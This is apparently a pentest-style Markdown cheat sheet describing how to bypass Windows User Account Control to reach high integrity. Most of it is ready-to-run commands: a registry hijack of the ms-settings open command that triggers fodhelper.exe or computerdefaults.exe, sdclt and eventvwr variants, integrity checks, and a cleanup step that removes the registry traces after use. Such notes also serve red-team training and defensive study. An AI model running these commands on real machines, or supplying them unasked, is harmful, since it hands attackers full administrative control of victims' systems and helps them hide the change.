# Windows Privilege Escalation – UAC Bypass

## Purpose

This file provides a structured workflow for bypassing User Account Control (UAC) to gain elevated privileges.

Core rules:
- UAC bypass requires admin privileges
- It does NOT escalate from standard user → admin
- It elevates from medium integrity → high integrity
- Useful after credential compromise

---

## 0. Mental Model

If you already have admin credentials:

You may still be running as:
→ medium integrity

UAC bypass:
→ elevates to high integrity (full admin)

---

## 1. Check Current Privileges (CRITICAL FIRST STEP)

whoami /groups

Look for:

Mandatory Label\Medium Mandatory Level

---

## 2. Confirm Admin Membership

whoami /groups | findstr Administrators

If present:
→ UAC bypass possible

---

## 3. Check UAC Settings

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

Look for:

EnableLUA  
ConsentPromptBehaviorAdmin  

---

## 4. Common UAC Bypass Techniques

---

# =========================
# 1. fodhelper.exe (MOST COMMON)
# =========================

## Exploit

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f

fodhelper.exe

---

## Result

Elevated command prompt

---

# =========================
# 2. computerdefaults.exe
# =========================

Similar method:

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f

computerdefaults.exe

---

# =========================
# 3. sdclt.exe (older systems)
# =========================

sdclt.exe /kickoffelev

---

# =========================
# 4. eventvwr.exe (legacy)
# =========================

Hijack registry:

HKCU\Software\Classes\mscfile\shell\open\command

---

# =========================
# 5. PowerShell Method
# =========================

Start-Process fodhelper.exe

---

## 5. Verify Elevated Context

whoami /groups

Look for:

Mandatory Label\High Mandatory Level

---

## 6. Cleanup (IMPORTANT)

Remove registry keys:

reg delete HKCU\Software\Classes\ms-settings /f

---

## 7. Common Failure Points

- not an admin user
- UAC set to Always Notify
- patched system
- incorrect registry path

---

## 8. When to Use UAC Bypass

USE when:
- you have admin credentials
- shell is not elevated
- need full admin access

DO NOT USE when:
- you are a low-priv user
- no admin group membership

---

## 9. Quick Exploit Pattern

1. confirm admin group
2. confirm medium integrity
3. set registry key
4. trigger auto-elevated binary
5. get elevated shell

---

## 10. Mental Model

Admin user ≠ full control  
UAC = barrier  
Bypass = full admin  

---

## 11. Golden Rules

- Always verify admin group first
- Always check integrity level
- Use fodhelper first (most reliable)
- Clean up registry after use
- Do not confuse with true privesc